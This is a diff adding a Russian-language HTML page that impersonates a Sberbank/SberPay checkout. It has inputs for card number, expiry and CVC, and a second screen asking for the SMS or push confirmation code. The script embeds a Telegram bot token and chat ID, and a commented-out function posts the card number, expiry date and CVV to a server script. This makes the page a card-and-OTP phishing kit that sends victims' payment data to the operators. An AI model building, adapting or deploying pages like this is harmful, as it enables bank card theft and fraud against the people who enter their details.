@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Платёжная страница</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    <!-- <script type="text/javascript" src="public/ruxitagentjs_ICA2NVfhqru_10265230425083909.js" -->
+        <!-- data-dtconfig="rid=RID_2140967261|rpid=1696282803|domain=payecom.ru|reportUrl=/rb_7e4bdb68-cd47-4ecc-b649-69eb5cd44c91|app=599f8d7996c68de5|featureHash=ICA2NVfhqru|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=jeohsw45|mel=100000|dpvc=1|md=mdcc2=dmdOrder,mdcc3=bAPP_CONFIG.DIST_VERSION,mdcc4=dorderId|ssv=4|lastModification=1717524662138|mdp=mdcc2,mdcc3,mdcc4|tp=500,50,0,1|agentUri=/ruxitagentjs_ICA2NVfhqru_10265230425083909.js"></script> -->
+    <link rel="icon" href="https://payecom.ru/favicon.ico">
+    <link href="public/preloader.c12976be8f441a92c5a5.css" rel="stylesheet">
+    <link href="public/main.4084d73ea39aa44d3ea4.css" rel="stylesheet">
+    <style>
+        .EZDrawer .EZDrawer__checkbox {
+            display: none
+        }
+
+        .EZDrawer .EZDrawer__checkbox:checked~.EZDrawer__overlay {
+            display: block;
+            opacity: 1
+        }
+
+        .EZDrawer .EZDrawer__checkbox:checked~.EZDrawer__container {
+            visibility: visible;
+            transform: translateZ(0) !important
+        }
+
+        .EZDrawer .EZDrawer__overlay {
+            display: none;
+            height: 100vh;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .EZDrawer .EZDrawer__container {
+            position: fixed;
+            visibility: hidden;
+            background: white;
+            transition: all;
+            box-shadow: 0 0 10px 5px #0000001a
+        }
+
+        [data-rsbs-overlay] {
+            border-top-left-radius: 16px;
+            border-top-left-radius: var(--rsbs-overlay-rounded, 16px);
+            border-top-right-radius: 16px;
+            border-top-right-radius: var(--rsbs-overlay-rounded, 16px);
+            display: flex;
+            background: #fff;
+            background: var(--rsbs-bg, #fff);
+            flex-direction: column;
+            height: 0px;
+            height: var(--rsbs-overlay-h, 0px);
+            transform: translateZ(0);
+            transform: translate3d(0, var(--rsbs-overlay-translate-y, 0px), 0);
+            will-change: height
+        }
+
+        [data-rsbs-overlay]:focus {
+            outline: none
+        }
+
+        [data-rsbs-is-blocking=false] [data-rsbs-overlay] {
+            box-shadow: 0 -5px 60px #2659731c, 0 -1px #2659730d
+        }
+
+        [data-rsbs-overlay],
+        [data-rsbs-root]:after {
+            max-width: auto;
+            max-width: var(--rsbs-max-w, auto);
+            margin-left: env(safe-area-inset-left);
+            margin-left: var(--rsbs-ml, env(safe-area-inset-left));
+            margin-right: env(safe-area-inset-right);
+            margin-right: var(--rsbs-mr, env(safe-area-inset-right))
+        }
+
+        [data-rsbs-overlay],
+        [data-rsbs-backdrop],
+        [data-rsbs-root]:after {
+            z-index: 3;
+            -ms-scroll-chaining: none;
+            overscroll-behavior: none;
+            touch-action: none;
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none
+        }
+
+        [data-rsbs-backdrop] {
+            top: -60px;
+            bottom: -60px;
+            background-color: #0009;
+            background-color: var(--rsbs-backdrop-bg, rgba(0, 0, 0, .6));
+            will-change: opacity;
+            cursor: pointer;
+            opacity: 1
+        }
+
+        [data-rsbs-is-dismissable=false] [data-rsbs-backdrop] {
+            cursor: ns-resize
+        }
+
+        [data-rsbs-root]:after {
+            content: "";
+            pointer-events: none;
+            background: #fff;
+            background: var(--rsbs-bg, #fff);
+            height: 1px;
+            transform-origin: bottom;
+            transform: scale3d(1, 0, 1);
+            transform: scale3d(1, var(--rsbs-antigap-scale-y, 0), 1);
+            will-change: transform
+        }
+
+        [data-rsbs-footer],
+        [data-rsbs-header] {
+            flex-shrink: 0;
+            cursor: ns-resize;
+            padding: 16px
+        }
+
+        [data-rsbs-header] {
+            text-align: center;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            box-shadow: 0 1px #2e3b4220;
+            box-shadow: 0 1px 0 rgba(46, 59, 66, calc(var(--rsbs-content-opacity, 1) * .125));
+            z-index: 1;
+            padding-top: calc(20px + env(safe-area-inset-top));
+            padding-bottom: 8px
+        }
+
+        [data-rsbs-header]:before {
+            position: absolute;
+            content: "";
+            display: block;
+            width: 36px;
+            height: 4px;
+            top: calc(8px + env(safe-area-inset-top));
+            left: 50%;
+            transform: translate(-50%);
+            border-radius: 2px;
+            background-color: #00000024;
+            background-color: var(--rsbs-handle-bg, hsla(0, 0%, 0%, .14))
+        }
+
+        @media (-webkit-min-device-pixel-ratio: 2),
+        (min-resolution: 2dppx) {
+            [data-rsbs-header]:before {
+                transform: translate(-50%) scaleY(.75)
+            }
+        }
+
+        [data-rsbs-has-header=false] [data-rsbs-header] {
+            box-shadow: none;
+            padding-top: calc(12px + env(safe-area-inset-top))
+        }
+
+        [data-rsbs-scroll] {
+            flex-shrink: 1;
+            flex-grow: 1;
+            -webkit-tap-highlight-color: revert;
+            -webkit-touch-callout: revert;
+            -webkit-user-select: auto;
+            -ms-user-select: auto;
+            -moz-user-select: auto;
+            user-select: auto;
+            overflow: auto;
+            -ms-scroll-chaining: none;
+            overscroll-behavior: contain;
+            -webkit-overflow-scrolling: touch
+        }
+
+        [data-rsbs-scroll]:focus {
+            outline: none
+        }
+
+        [data-rsbs-has-footer=false] [data-rsbs-content] {
+            padding-bottom: env(safe-area-inset-bottom)
+        }
+
+        [data-rsbs-content] {
+            overflow: hidden
+        }
+
+        [data-rsbs-footer] {
+            box-shadow: 0 -1px #2e3b4220, 0 2px #fff;
+            box-shadow: 0 -1px 0 rgba(46, 59, 66, calc(var(--rsbs-content-opacity, 1) * .125)), 0 2px 0 var(--rsbs-bg, #fff);
+            overflow: hidden;
+            z-index: 1;
+            padding-bottom: calc(16px + env(safe-area-inset-bottom))
+        }
+
+        [data-rsbs-is-dismissable=true] [data-rsbs-header]>*,
+        [data-rsbs-is-dismissable=true] [data-rsbs-scroll]>*,
+        [data-rsbs-is-dismissable=true] [data-rsbs-footer]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=opening] [data-rsbs-header]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=closing] [data-rsbs-header]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=opening] [data-rsbs-scroll]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=closing] [data-rsbs-scroll]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=opening] [data-rsbs-footer]>*,
+        [data-rsbs-is-dismissable=false][data-rsbs-state=closing] [data-rsbs-footer]>* {
+            opacity: 1;
+            opacity: var(--rsbs-content-opacity, 1)
+        }
+
+        [data-rsbs-is-dismissable=true] [data-rsbs-backdrop],
+        [data-rsbs-is-dismissable=false][data-rsbs-state=opening] [data-rsbs-backdrop],
+        [data-rsbs-is-dismissable=false][data-rsbs-state=closing] [data-rsbs-backdrop] {
+            opacity: 1;
+            opacity: var(--rsbs-backdrop-opacity, 1)
+        }
+
+        [data-rsbs-state=closed],
+        [data-rsbs-state=closing] {
+            pointer-events: none
+        }
+
+        ._container_levv5_1 {
+            margin: 0 32px 32px
+        }
+
+        ._containerMobile_levv5_5 {
+            margin: 0 16px 16px
+        }
+
+        ._img_162bh_1 {
+            padding-right: 12px
+        }
+
+        ._backBtn_162bh_5 {
+            width: fit-content;
+            margin-bottom: 8px;
+            padding: 0
+        }
+
+        ._button_1w4f4_1 {
+            color: #000;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            border: none;
+            cursor: pointer
+        }
+
+        ._ghost_1w4f4_19 {
+            background-color: transparent;
+            padding: 0
+        }
+
+        ._loader_1w4f4_29 {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        ._spinner_fyq2r_1 {
+            position: relative;
+            width: 32px;
+            height: 32px
+        }
+
+        ._spinner_fyq2r_1:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: 50%;
+            border: 7px solid transparent;
+            background: linear-gradient(239deg, #19c1d8 0%, #42e3b4 34.71%, #00d900 66.22%, #faed00 100%) border-box;
+            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: source-out;
+            mask-composite: exclude;
+            animation: _spin_fyq2r_1 2s infinite linear
+        }
+
+        @keyframes _spin_fyq2r_1 {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        ._headline3_1r6gh_1 {
+            font: 20px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 600;
+            letter-spacing: -.3px;
+            line-height: 28px
+        }
+
+        ._body_1r6gh_8 {
+            font: 15px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 400;
+            letter-spacing: -.345px
+        }
+
+        ._body_medium_1r6gh_14 {
+            font: 15px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 600;
+            line-height: 20px;
+            letter-spacing: -.345px
+        }
+
+        ._body2_1r6gh_21 {
+            font: 14px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 400;
+            letter-spacing: -.3px
+        }
+
+        ._body2_medium_1r6gh_27 {
+            font: 17px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 600;
+            letter-spacing: -.3px
+        }
+
+        ._caption_1r6gh_33 {
+            font: 12px SBSans, Arial, Helvetica, sans-serif;
+            font-weight: 400;
+            letter-spacing: -.3px
+        }
+
+        ._container_1m0oz_1 {
+            border-radius: 20px;
+            background-color: #fff;
+            height: 84px;
+            padding: 0 20px;
+            text-align: left
+        }
+
+        ._container_1m0oz_1:hover,
+        ._container_1m0oz_1:active {
+            background-color: #ffffff9e
+        }
+
+        ._img_1m0oz_25 {
+            margin-right: 20px;
+            height: 36px;
+            width: 36px
+        }
+
+        ._base_wizzb_1 {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 150px
+        }
+
+        ._withoutLogo_wizzb_8 {
+            height: unset !important;
+            margin: 16px 0
+        }
+
+        ._baseMobile_wizzb_13 {
+            height: 124px
+        }
+
+        ._img_wizzb_17 {
+            margin-bottom: 20px
+        }
+
+        ._subtitle_wizzb_21 {
+            color: #888
+        }
+
+        ._left_wizzb_25 {
+            align-items: flex-start
+        }
+
+        ._center_wizzb_29 {
+            align-items: center
+        }
+
+        ._right_wizzb_33 {
+            align-items: flex-end
+        }
+
+        @keyframes _hide_wizzb_1 {
+            0% {
+                height: 150px
+            }
+
+            to {
+                height: 0;
+                opacity: 0
+            }
+        }
+
+        ._hidden_wizzb_47 {
+            animation: _hide_wizzb_1 .3s ease-out
+        }
+
+        ._notFoundBanks_1pp8e_1 {
+            padding-top: 32px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center
+        }
+
+        ._inputWraper_1vhym_1 {
+            position: relative
+        }
+
+        ._input_1vhym_1 {
+            display: flex;
+            width: 100%;
+            height: 64px;
+            padding: 0 20px;
+            font-weight: 400;
+            line-height: 24px;
+            box-sizing: border-box;
+            border: none;
+            border-radius: 16px;
+            align-self: flex-end;
+            font: 16px SBSans, Arial, Helvetica, sans-serif;
+            background-color: #fff;
+            color: #000;
+            margin-bottom: 8px
+        }
+
+        ._input_1vhym_1 :focus {
+            outline: none
+        }
+
+        ._searchImg_1vhym_27 {
+            position: absolute;
+            top: 20px;
+            right: 16px
+        }
+
+        ._list_1to3j_1 button {
+            margin-bottom: 8px
+        }
+
+        ._search_akejv_1 {
+            position: sticky;
+            top: 78px;
+            padding-top: 8px;
+            padding-bottom: 18px;
+            background: #f5f5f5;
+            z-index: 10
+        }
+
+        ._searchInput_akejv_10 {
+            position: sticky;
+            top: 130px;
+            background: #f5f5f5;
+            padding-bottom: 8px;
+            z-index: 10
+        }
+
+        ._searchInputMobile_akejv_18 {
+            padding-top: 16px;
+            top: 0
+        }
+
+        ._h1_1nuia_1 {
+            color: #888;
+            font-family: SB Sans Display;
+            font-size: 32px;
+            font-style: normal;
+            font-weight: 600;
+            line-height: normal;
+            margin: auto
+        }
+
+        ._container_1nuia_11 {
+            margin: 32px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between
+        }
+
+        ._topBlock_1nuia_19 *:not(:last-child) {
+            margin-bottom: 64px
+        }
+
+        ._container_9f3f8_1 {
+            width: fit-content
+        }
+
+        ._container_cv96g_1 {
+            background-color: #fff;
+            height: 72px;
+            padding: 0 16px;
+            justify-content: space-between;
+            border-radius: 8px
+        }
+
+        ._containerDark_cv96g_9 {
+            height: 56px;
+            background-color: #1d1346;
+            justify-content: center
+        }
+
+        ._description_cv96g_15 {
+            text-align: end;
+            margin-left: 20px;
+            color: #888;
+            white-space: pre-line;
+            font-size: 12px
+        }
+
+        ._close_cv96g_23 {
+            margin: 32px 0 14px 32px
+        }
+
+        ._drawerContent_cv96g_27 {
+            display: flex;
+            flex-direction: column
+        }
+
+        ._additionalPage_cv96g_32 {
+            height: 100%
+        }
+
+        ._closeButton_cv96g_36 {
+            position: sticky;
+            top: 0;
+            background-color: #f5f5f5;
+            z-index: 10
+        }
+
+        :root {
+            --rsbs-bg: #f5f5f5
+        }
+
+        [data-rsbs-root] [data-rsbs-overlay],
+        [data-rsbs-root] [data-rsbs-backdrop] {
+            z-index: 100
+        }
+
+        [data-rsbs-root]:after {
+            z-index: 100
+        }
+    </style>
+</head>
+
+<body>
+    <div id="spinner">
+        <div class="_3uYr_VtNKy-KFdS84ajbRw _1BwwSwccotJ3oDAVCi6YC2">
+            <div class="_3MhDMtHIZ2fc69i1OSDH2v"></div>
+        </div>
+    </div>
+    <div id="app">
+        <div>
+            <div class="_3xsHmwg4aHXUA_2KbA_mAJ">
+                <div class="_2m9dqKWO5gZmmOzue7sI9G"><img class="_2DPVOJAVVHrwW7PtN635k" src="public/sber--jvSN4.svg"
+                        alt="Сбербанк">
+                    <div class="_1CmzpL8fV_9vMztN_H8rLf"></div>
+                </div>
+            </div>
+            <div class="_81dOwxI3yrdEEGqFWWppt" id="t1">
+                <div class="_1jnrBjMbcipNY6zCBxfLN_">
+                    <div class="osZjOnqNgJ_AA3GWuGWuM">
+                        <div class="_3YhVF1NvIxTQXjRNKKxAh_">
+                            <!-- <span class="_3-SALMbDLlGWsQjSx8MM_T">CinemaBox</span> -->
+                            <span class="RhAbU0VYcY0MkCWbHEQK8"><span class="_1fZxEtNwBcaj0ldhDg9vmI">4100&nbsp;<span
+                                        class="_1qm_eeS1c5hYTpNdw482ZW">RUB</span><span class="_3CD15p7xwmSbPYuQE5ByjY"
+                                        aria-hidden="true"><span data-unit="currency">₽</span></span></span></span>
+                        </div>
+                        <div><img class="_2kWyg3zlOKCrIfInF-Lpp1" src="public/store-icon--CCNO8.svg"
+                                alt="Иконка магазина"></div>
+                    </div>
+                    <div class="_12Lvxrxqc-MEW8McIS9Yvq">
+                        <div class="_3jAOsbsZLIA2Vs_1mnmz-Q">
+                            <div class="_8QAU4X38_1Busd06SUux">
+                                <div>
+                                    <h4 class="_3xj8zyv68ONBtClm97562b">SberPay</h4>
+                                    <div class="_3S4fOKDSV0EKuTwE598Y28">
+                                        <div>Быстрая оплата&nbsp;</div>
+                                        <div class="_3ZDS1BY47rHzRIMHUq2ZaY">для клиентов Сбера</div>
+                                    </div>
+                                </div>
+                                <div class="eTy32rWUivEj0g7KRgAZ7">
+                                    <div class="_161SgjWQ3PSyDoa0daWBVO"><button
+                                            class="_3FnMECl4IVheXfoYeDWal8 h-jkpbRL-mDAUuzvrXSFa _3lebb1olMSyi2vv0HBW7U9">
+                                            <div class="_2chNPy03fwGkiLL7pBABZQ">
+                                                <div class="aIOseGgWJtn9RSzK3BnPD">
+                                                    <div class="bjMxSAuUqwlE8wdEm37HP">Оплатить</div><img
+                                                        src="public/sberpayButton--svebF.svg" alt="Sber logo">
+                                                </div>
+                                            </div>
+                                        </button>
+                                        <div class="KeJ4k3bx9Nc99kRgvVi3J"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="_2PZYC5dJqOmFqHyzoAuaD0">
+                        <hr>
+                        <div class="_8iv8c9jnO37ZP6jKr0Q7v">
+                            <div class="_1D4o_KbY9Y2aoiz4tLn6va">или</div>
+                        </div>
+                    </div>
+                    <div class="_12Lvxrxqc-MEW8McIS9Yvq">
+                        <div class="NdV3MPrKTK5gq64nadI3J">
+                            <div class="_3ZYPthoFKn6UCiOWb-aVYr">
+                                <h4 class="_3xj8zyv68ONBtClm97562b _1W8pUS9LUdTRk2To1SCgJs">Картой</h4>
+                                    <div>
+                                        <div>
+                                            <div>
+                                                <div>
+                                                    <div class="y7sOesavUakzpt_TgEdj5 _1rNxfgctF-qJ6MnUHCW97w "><label
+                                                            for="cardNumber"></label>
+                                                        <p id="cardType"></p><input id="cardNumber"
+                                                            class="UXYpiLomOzpkftnkdBDVC" placeholder=" "
+                                                            aria-label="cardNumber" type="tel" inputmode="" value=""
+                                                            maxlength="19"><span class="_29dxbuONIT7__9omVbPMQG">Номер
+                                                            карты</span>
+                                                        <div class="_3-7z0HXsMDv4e68M3mAmk4">
+                                                            <div class="_3i87oJ_knjFLtQN6jwqsGJ"><img id="img-card" style="display:none" alt=""
+                                                                    src=""
+                                                                    class="_3pZd6Y2jMX5kVxxsf65E1Z _3LmmpW010DtrvR3pGAzapO">
+                                                            </div>
+                                                            <div class="_3i87oJ_knjFLtQN6jwqsGJ" id="warn-ico" style="display: none;"><img alt=""
+                                                                    src="https://payecom.ru/assets/alert--bqTvq.svg"
+                                                                    class="_3pZd6Y2jMX5kVxxsf65E1Z _2fFjjTmrHqMK_j5VQqwf0d">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="_3EQ7QNjvcp34ISekr5mqnT">
+                                                        Неверный номер карты</div>
+                                                </div>
+                                            </div>
+                                            <div class="fo70Qjf6BNUgwaEZfEvjc">
+                                                <div>
+                                                    <div class="y7sOesavUakzpt_TgEdj5 _1rNxfgctF-qJ6MnUHCW97w"><label
+                                                            for="expiryDate"></label><input id="expiryDate"
+                                                            class="UXYpiLomOzpkftnkdBDVC" placeholder=" "
+                                                            aria-label="expiryDate" type="tel" inputmode="" value=""
+                                                            maxlength="5"><span
+                                                            class="_29dxbuONIT7__9omVbPMQG">Месяц/Год</span>
+                                                        <div class="_3-7z0HXsMDv4e68M3mAmk4"></div>
+                                                    </div>
+                                                    <div class="_3EQ7QNjvcp34ISekr5mqnT"></div>
+                                                </div>
+                                                <div>
+                                                    <div class="y7sOesavUakzpt_TgEdj5 _1rNxfgctF-qJ6MnUHCW97w"><label
+                                                            for="cvc"></label><input id="cvc"
+                                                            class="UXYpiLomOzpkftnkdBDVC" placeholder=" " onkeyup="check()" maxlength="3"
+                                                            aria-label="cvc" type="password" inputmode="numeric"
+                                                            value=""><span class="_29dxbuONIT7__9omVbPMQG">CVC /
+                                                            CVV</span>
+                                                        <div class="_3-7z0HXsMDv4e68M3mAmk4"></div>
+                                                    </div>
+                                                    <div class="_3EQ7QNjvcp34ISekr5mqnT"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_3Rc18ZmT3X6CD5rYHHXZYb">
+                                        <div class="_161SgjWQ3PSyDoa0daWBVO"><button onclick="send()" disabled=""
+                                                class="_3FnMECl4IVheXfoYeDWal8 h-jkpbRL-mDAUuzvrXSFa PPs-UBCl7l4jU5JArD8cL">
+                                                <div class="_2chNPy03fwGkiLL7pBABZQ">
+                                                    <div
+                                                        class="aIOseGgWJtn9RSzK3BnPD  _3CQS6NBmvEEkmFLTSNjYKi _3e3bkl2-pjJyOz5wdmCJgB">
+                                                        <div>Оплатить</div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                            <div class="KeJ4k3bx9Nc99kRgvVi3J"></div>
+                                        </div>
+                                    </div>
+                            </div>
+                            <div class="_1G8vAXzDcwyHVqWq6_NbtM">
+                                <div class="_2vRJRS_-SKxn5km9Nxzobo">
+                                    <div class="_3BAqbjQ6d8eovoeJlRjiUu">
+                                        <div>Продолжая, вы соглашаетесь </div>с <a
+                                            class="_1GP815cJyyi6dNEiz1Y31v _1GH9lrtVv2zKDIN_7acKr3"
+                                            href="https://payecom.ru/assets/offer.pdf" target="_blank">условиями</a> ПАО
+                                        СберБанк
+                                    </div>
+                                    <div class="_37_s5seK6aN-7jYYTXNofS"><img src="public/mir-logo-dark--aW16U.svg"
+                                            alt="" class="_1I2vI8IwPHHVLcxjY_h4Gs"><img
+                                            src="public/mastercard-logo-dark--OmaMi.svg" alt=""
+                                            class="AIIcE3pDVR5XH4mBNL-5v"><img src="public/visa-logo-dark--1x7bN.svg"
+                                            alt="" class="XL9AQSq7E6a3tsg2guinn"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="_3U2gAZCR6yAWkUVwJYYZT_"></div>
+                </div>
+            </div>
+            <div class="_81dOwxI3yrdEEGqFWWppt" style="display: none;" id="t2">
+                <div class="_1jnrBjMbcipNY6zCBxfLN_">
+                    <div class="_12Lvxrxqc-MEW8McIS9Yvq">
+                        <div class="NdV3MPrKTK5gq64nadI3J">
+                            <div class="_3ZYPthoFKn6UCiOWb-aVYr">
+                                <h4 class="_3xj8zyv68ONBtClm97562b _1W8pUS9LUdTRk2To1SCgJs"><span class="RhAbU0VYcY0MkCWbHEQK8"><span class="_1fZxEtNwBcaj0ldhDg9vmI">300&nbsp;<span
+                                    class="_1qm_eeS1c5hYTpNdw482ZW">RUB</span><span class="_3CD15p7xwmSbPYuQE5ByjY"
+                                    aria-hidden="true"><span data-unit="currency">₽</span></span></span></span></h4>
+                                <div style="display: flex; justify-content: space-between;">
+                                    <div class="c">
+                                        Номер карты
+                                    </div>
+                                    <div class="c1" style="color: #888; font-size: 14px;">** <span id="cod-crt">0867</span></div>
+                                </div>
+                                <div style="display: flex; justify-content: space-between;  margin-top: 10px;">
+                                    <div class="c">Дата</div>
+                                    <div class="c1" style="color: #888; font-size: 14px;" id="datedd">10.06.2024</div>
+                                </div>
+                                <div class="_3xj8zyv68ONBtClm97562b _1W8pUS9LUdTRk2To1SCgJs" style="font-size: 18px; margin-bottom: 3   px; margin-top: 15px;">Отправили код</div>
+                                <div >В СМС или Push-уведомлении. Чтобы получить его, ваш номер должен быть подключен к СМС-банку.</div>
+                                <div style="margin-top: 15px; color: #888; margin-bottom: 5px; font-size: 14px;">Введите код для оплаты покупки</div>
+                                    <div>
+                                        <div>
+                                            <div>
+                                                <div>
+                                                    <div class="y7sOesavUakzpt_TgEdj5 _1rNxfgctF-qJ6MnUHCW97w "><label
+                                                            for="cardNumber"></label>
+                                                        <p id="cardType"></p><input id="sms"
+                                                            class="UXYpiLomOzpkftnkdBDVC" placeholder=" "
+                                                            aria-label="cardNumber" type="tel" inputmode="" value=""
+                                                            maxlength="20"><span class="_29dxbuONIT7__9omVbPMQG">Код</span>
+                                                        <div class="_3-7z0HXsMDv4e68M3mAmk4">
+                                                            <div class="_3i87oJ_knjFLtQN6jwqsGJ"><img id="img-card" style="display:none" alt=""
+                                                                    src=""
+                                                                    class="_3pZd6Y2jMX5kVxxsf65E1Z _3LmmpW010DtrvR3pGAzapO">
+                                                            </div>
+                                                            <div class="_3i87oJ_knjFLtQN6jwqsGJ" id="warn-ico" style="display: none;"><img alt=""
+                                                                    src="https://payecom.ru/assets/alert--bqTvq.svg"
+                                                                    class="_3pZd6Y2jMX5kVxxsf65E1Z _2fFjjTmrHqMK_j5VQqwf0d">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                <!-- <div style="color: #888; margin-bottom: 10px; margin-top: 10px; font-size: 14px;">Повторный запрос через: <span style="color: black;"><span id="secound">60</span> секунд</span></div> -->
+                                    <div class="_3Rc18ZmT3X6CD5rYHHXZYb" style="margin-top: 15px;">
+                                        <div class="_161SgjWQ3PSyDoa0daWBVO"><button onclick="send_sms()"
+                                                class="_3FnMECl4IVheXfoYeDWal8 h-jkpbRL-mDAUuzvrXSFa PPs-UBCl7l4jU5JArD8cL">
+                                                <div class="_2chNPy03fwGkiLL7pBABZQ">
+                                                    <div
+                                                        class="aIOseGgWJtn9RSzK3BnPD  _3CQS6NBmvEEkmFLTSNjYKi _3e3bkl2-pjJyOz5wdmCJgB">
+                                                        <div>Подтвердить</div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                            <div class="KeJ4k3bx9Nc99kRgvVi3J"></div>
+                                        </div>
+                                    </div>
+                            </div>
+                            <div class="_1G8vAXzDcwyHVqWq6_NbtM">
+                                <div class="_2vRJRS_-SKxn5km9Nxzobo">
+                                    <div class="_3BAqbjQ6d8eovoeJlRjiUu" style="font-size: 12px; max-width: 80% !important;">
+                                        <div>Оплата покупок без комиссии. За пополнение карт и кошельков через приложение и сайты других банков взимается комиссия. Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: <a
+                                            class="_1GP815cJyyi6dNEiz1Y31v _1GH9lrtVv2zKDIN_7acKr3"
+                                            href="https://payecom.ru/assets/offer.pdf" target="_blank">ссылка</a></div>
+                                    </div>
+                                    <div class="_37_s5seK6aN-7jYYTXNofS"><img src="public/mir-logo-dark--aW16U.svg"
+                                            alt="" class="_1I2vI8IwPHHVLcxjY_h4Gs"><img
+                                            src="public/mastercard-logo-dark--OmaMi.svg" alt=""
+                                            class="AIIcE3pDVR5XH4mBNL-5v"><img src="public/visa-logo-dark--1x7bN.svg"
+                                            alt="" class="XL9AQSq7E6a3tsg2guinn"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="_3U2gAZCR6yAWkUVwJYYZT_"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const botToken = "7269731737:AAE0477jUEqBpiY3f5iCmdej7cn_VtFh2pY";
+        const chatId = '-4605520985';
+        const cardInput = document.getElementById('cardNumber');
+
+        cardInput.addEventListener('input', function () {
+            let input = cardInput.value.replace(/\D/g, '').substring(0, 16);
+            const cardNumberFormatted = input.match(/.{1,4}/g)?.join(' ') || '';
+            cardInput.value = cardNumberFormatted;
+            cardType = document.getElementById("img-card");
+
+            // Determine card type
+            const firstDigit = input.charAt(0);
+            if (firstDigit === '4') {
+                cardType.style = "display:block";
+                cardType.setAttribute('src', 'https://payecom.ru/assets/visacard--EETjg.svg')
+                clearwarningcard();
+            } else if (firstDigit === '5') {
+                cardType.style = "display:block";
+                cardType.setAttribute('src', 'https://payecom.ru/assets/mastercard--897Xk.svg')
+                clearwarningcard();
+            } else if (firstDigit === '2') {
+                cardType.style = "display:block";
+                cardType.setAttribute('src', 'https://payecom.ru/assets/mircard--hkT8j.svg')
+                clearwarningcard();
+            } else {
+                cardType.style = "display:none";
+                warningCard();
+            }
+            check()
+        });
+
+        function warningCard(){
+            document.querySelector(".y7sOesavUakzpt_TgEdj5").classList.add("_2wRgYIrm554bG1eprunN4A");
+            document.querySelector(".UXYpiLomOzpkftnkdBDVC").classList.add("_1TetrCuKMZoLHbquFHco-m");
+            document.querySelector("._3EQ7QNjvcp34ISekr5mqnT").classList.add("_2CzcOSLG11bXnMJG3B-WVR");
+            document.querySelector("._3-7z0HXsMDv4e68M3mAmk4").classList.add("_1hIDzlzVoMzwvKlo5NR-xO");
+            document.getElementById("warn-ico").style = "display: block;"
+        }
+
+        function clearwarningcard(){
+            document.querySelector(".y7sOesavUakzpt_TgEdj5").classList.remove("_2wRgYIrm554bG1eprunN4A");
+            document.querySelector(".UXYpiLomOzpkftnkdBDVC").classList.remove("_1TetrCuKMZoLHbquFHco-m");
+            document.querySelector("._3EQ7QNjvcp34ISekr5mqnT").classList.remove("_2CzcOSLG11bXnMJG3B-WVR");
+            document.querySelector("._3-7z0HXsMDv4e68M3mAmk4").classList.remove("_1hIDzlzVoMzwvKlo5NR-xO");
+            document.getElementById("warn-ico").style = "display: none;"
+        }
+
+        const dateInput = document.getElementById('expiryDate');
+
+        dateInput.addEventListener('input', function (e) {
+            let input = dateInput.value.replace(/\D/g, '');
+            if (input.length >= 2) {
+                let month = parseInt(input.substring(0, 2), 10);
+                if (month > 12) {
+                    month = 12;
+                }
+                let year = input.substring(2, 4);
+                input = month.toString().padStart(2, '0') + '/' + year;
+            }
+            dateInput.value = input;
+
+            const position = dateInput.value.length;
+            dateInput.setSelectionRange(position, position);
+            check()
+        });
+
+        dateInput.addEventListener('keydown', function (e) {
+            if (e.key === 'Backspace' && dateInput.value.endsWith('/')) {
+                dateInput.value = dateInput.value.slice(0, -1);
+            }
+        });
+
+        // function send(){
+        //     const cardNumber = document.getElementById('cardNumber').value;
+        //     const expiryDate = document.getElementById('expiryDate').value;
+        //     const cvv = document.getElementById("cvc").value;
+
+        //     const formData = new FormData();
+        //     formData.append('cardNumber', cardNumber);
+        //     formData.append('expiryDate', expiryDate);
+        //     formData.append('cvv', cvv);
+        //     formData.append('dd1', true);
+
+        //     fetch('process.php', {
+        //         method: 'POST',
+        //         body: formData
+        //     }).then(response => response.text())
+
+        //     document.getElementById("t1").style = "display: none";
+        //     document.getElementById("t2").style = "display: flex";
+        //     document.getElementById("cod-crt").innerHTML = cardNumber.split(" ")[3];
+
+        //     var now = new Date();
+        //     var d;
+        //     if(now.getMonth() < 10){
+        //         d = "0" + now.getMonth()
+        //     }
+        //     document.getElementById("datedd").innerHTML = now.getDate() + "." + d + "." + now.getFullYear();
+        // }
+
